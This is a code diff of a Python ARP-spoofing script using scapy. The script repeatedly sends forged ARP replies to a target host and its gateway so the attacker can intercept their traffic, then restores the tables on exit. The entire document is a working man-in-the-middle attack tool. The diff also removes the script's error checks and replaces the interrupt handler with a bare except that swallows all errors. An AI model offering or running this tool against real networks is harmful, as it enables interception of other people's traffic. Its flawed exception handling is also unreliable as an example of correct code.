@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 
+import subprocess
 import scapy.all as scapy
 import time
 import argparse
@@ -9,47 +10,40 @@ def scan(target_ip):
     broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
-    if answered:
-        return answered[0][1].hwsrc
-    else:
-        print(f"[-] No response from IP: {target_ip}")
-        return None
+    return answered[0][1].hwsrc
 
-def arpspoof(target_ip, gateway_ip):
-    target_mac = scan(target_ip)
-    if target_mac is None:
-        return
-    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip)
-    scapy.send(packet, verbose = False)
+def arpspoof(target, gateway):
+	target_mac = scan(target)
+	packet = scapy.ARP(op = 2, pdst = target, hwdst = target_mac, psrc = gateway)
+	scapy.send(packet, verbose = False)
 
-def restore(target_ip, gateway_ip):
-    target_mac = scan(target_ip)
-    gateway_mac = scan(gateway_ip)
-    if target_mac is None or gateway_mac is None:
-        return
-    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip, hwsrc = gateway_mac)
-    scapy.send(packet, verbose = False)
+def restore(target, gateway):
+	target_mac = scan(target)
+	gateway_mac = scan(gateway)
+	packet = scapy.ARP(op = 2, pdst = target, hwdst = target_mac, psrc = gateway, hwsrc = gateway_mac)
+	scapy.send(packet, verbose = False)
 
-def main():
-    parser = argparse.ArgumentParser(description="ARP Spoofing Script")
-    parser.add_argument("-t", "--target", required=True, help="Target IP address")
-    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
-    args = parser.parse_args()
+def get_arguements():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest = "target_ip", help = "Enter target IP address.")
+    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "Enter gateway IP address.")
+    options = parser.parse_args()
+    return options
 
-    target_ip = args.target
-    gateway_ip = args.gateway
 
+def run(target, gateway):
     count = 2
     try:
         while True:
-            arpspoof(target_ip, gateway_ip)
-            arpspoof(gateway_ip, target_ip)
-            print("\r[+] packets sent = " + str(count), end="")
+            arpspoof(target, gateway)
+            arpspoof(gateway, target)
+            print("\r[+] packets sent = " + str(count), end = "")
             count += 2
             time.sleep(2)
-    except KeyboardInterrupt:
+    except:
+        KeyboardInterrupt
         print("\nExiting..")
-        restore(target_ip, gateway_ip)
+        restore(target, gateway)
 
-if __name__ == "__main__":
-    main()
+options = get_arguements()
+run(options.target_ip, options.gateway_ip)
